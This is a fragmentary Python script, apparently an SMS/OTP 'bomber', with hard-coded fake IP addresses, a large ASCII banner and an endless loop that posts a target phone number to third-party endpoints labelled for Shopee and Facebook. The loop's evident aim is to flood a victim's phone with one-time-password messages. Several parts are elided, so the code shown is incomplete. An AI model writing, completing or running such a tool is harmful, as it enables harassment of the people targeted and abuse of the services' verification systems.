...
fake_ip = '157.240.21.35'
fake_ip = '143.92.75.65'
def banner():
 banner = f"""
 \033[1;93m
███████╗██████╗  █████╗ ███╗   ███╗     ██████╗ ████████╗██████╗     ██████╗ ██████╗  ██████╗ 
...
while True:
    ...
    string=requests.post(f'https://api-sms-v2.herokuapp.com/shopee?phone={sdt}').text
    string=requests.post(f'https://api-sms-v2.herokuapp.com/facebook?={sdt}').text
